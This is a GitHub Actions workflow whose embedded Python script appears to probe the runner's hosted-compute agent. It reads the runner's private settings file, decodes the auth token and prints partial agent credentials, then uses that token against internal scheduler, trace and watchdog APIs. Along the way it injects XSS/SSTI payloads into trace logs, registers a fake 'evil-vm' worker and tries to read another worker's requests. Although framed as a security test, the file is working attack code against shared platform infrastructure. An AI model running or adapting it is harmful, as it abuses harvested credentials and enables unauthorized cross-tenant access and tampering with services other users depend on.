name: HCA API Test
on:
  push:
    paths:
      - '.github/workflows/recon.yml'

jobs:
  api-test:
    runs-on: ubuntu-latest
    steps:
      - name: API Deep Recon
        run: |
          python3 << 'PYEOF'
          import json, os, urllib.request, urllib.error, ssl, time

          ctx = ssl.create_default_context()
          settings_path = "/opt/hca/.settings"
          with open(settings_path) as f:
              settings = json.load(f)

          auth_token = settings["authToken"]
          scheduler_url = settings["schedulerApiUrl"]
          trace_url = settings["traceApiUrl"]
          watchdog_url = settings["watchdogTraceApiUrl"]
          config_id = settings.get("configId", "")
          
          # Print full settings (redacting secrets)
          print("[+] FULL SETTINGS (redacted):")
          for k, v in settings.items():
              if k in ('authToken',):
                  # Decode JWT claims
                  import base64
                  parts = v.split('.')
                  if len(parts) == 3:
                      # Fix padding
                      payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
                      claims = json.loads(base64.urlsafe_b64decode(payload))
                      print(f"  {k} (JWT claims): {json.dumps(claims, indent=2)}")
              elif k == 'diagnosticsSasUri':
                  print(f"  {k}: {v[:100]}...")
              elif k == 'runnerAgentCredentials':
                  print(f"  {k}: {v[:100]}...")
              elif k == 'runnerAgentCredentialsRSA':
                  print(f"  {k}: {str(v)[:100]}...")
              else:
                  print(f"  {k}: {json.dumps(v)}")

          headers = {
              "Authorization": f"Bearer {auth_token}",
              "Content-Type": "application/json",
              "User-Agent": "hosted-compute-agent/1.0"
          }
          
          def api_call(method, url, body=None):
              try:
                  data = json.dumps(body).encode() if body else None
                  req = urllib.request.Request(url, data=data, headers=headers, method=method)
                  resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                  body_resp = resp.read().decode()
                  print(f"  [{resp.status}] {body_resp[:800]}")
                  return resp.status, body_resp
              except urllib.error.HTTPError as e:
                  body_resp = e.read().decode() if e.fp else ""
                  print(f"  [HTTP {e.code}] {body_resp[:800]}")
                  return e.code, body_resp
              except Exception as e:
                  print(f"  [ERROR] {e}")
                  return 0, str(e)

          # Test 1: Fix trace API - level as integer (0=debug, 1=info, 2=warn, 3=error?)
          print("\n=== TRACE API - level as int ===")
          for level in [0, 1, 2, 3, 4, 5]:
              trace_body = [{
                  "level": level,
                  "message": f"test level {level}",
                  "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                  "logger": "hosted-compute-agent",
                  "tracepoint": "security.test",
                  "sourceCorrelationId": config_id,
                  "processLifetimeId": "plid-001",
                  "orchestrationId": "orch-001",
                  "requestId": "req-001"
              }]
              print(f"  level={level}:")
              status, resp = api_call("POST", trace_url, trace_body)
              if status == 200:
                  print(f"  >>> LEVEL {level} ACCEPTED!")
                  break

          # Test 2: Inject crafted trace with XSS/SSTI payload
          print("\n=== TRACE INJECTION TEST ===")
          inject_body = [{
              "level": 1,
              "message": "<script>alert('xss')</script>{{7*7}}",
              "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
              "logger": "security-test",
              "tracepoint": "injection.test",
              "sourceCorrelationId": "INJECTED-" + config_id,
              "processLifetimeId": "INJECT-plid",
              "orchestrationId": "INJECT-orch",
              "requestId": "INJECT-req",
              "additionalData": {"injected": True, "payload": "test"},
              "properties": {"source": "pentest"}
          }]
          api_call("POST", trace_url, inject_body)

          # Test 3: Watchdog with crafted data
          print("\n=== WATCHDOG INJECTION ===")
          api_call("POST", watchdog_url, inject_body)

          # Test 4: Try PATCH /request (notify start)
          print("\n=== PATCH /request ===")
          api_call("PATCH", f"{scheduler_url}/request")

          # Test 5: Try different outcomes on DELETE
          print("\n=== DELETE /request info (don't actually finish) ===")
          # Try with an invalid outcome to see error messages
          api_call("DELETE", f"{scheduler_url}/request?outcome=99")

          # Test 6: Register with custom body
          print("\n=== POST /worker with body ===")
          worker_body = {
              "vmName": "evil-vm",
              "configId": config_id,
              "osType": "linux",
              "realm": "github"
          }
          api_call("POST", f"{scheduler_url}/worker", worker_body)
          
          # Test 7: Try to read another worker's data
          print("\n=== Cross-worker access ===")
          api_call("GET", f"{scheduler_url}/request?workerId=other-worker-id")
          
          # Test 8: SSRF via trace/watchdog - try internal URLs
          print("\n=== Trace API error detail ===")
          # Malformed body to get more error info
          api_call("POST", trace_url, "not json")
          api_call("POST", trace_url, [{"wrong": "schema"}])
          
          PYEOF
